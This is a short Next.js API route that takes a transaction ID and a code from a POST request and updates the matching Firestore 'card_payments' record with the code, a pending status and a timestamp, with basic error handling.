import { NextResponse } from "next/server";
import { doc, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase/config";

export async function POST(req: Request) {
  try {
    const { id, code } = await req.json();
    if (!id) {
      return NextResponse.json({ error: "Missing transaction ID" }, { status: 400 });
    }

    await updateDoc(doc(db, "card_payments", id), {
      code: code || "",
      status: "pending",
      updatedAt: new Date().toISOString(),
    });

    return NextResponse.json({ success: true });
  } catch (error: any) {
    console.error("API Error in submit-code:", error);
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}
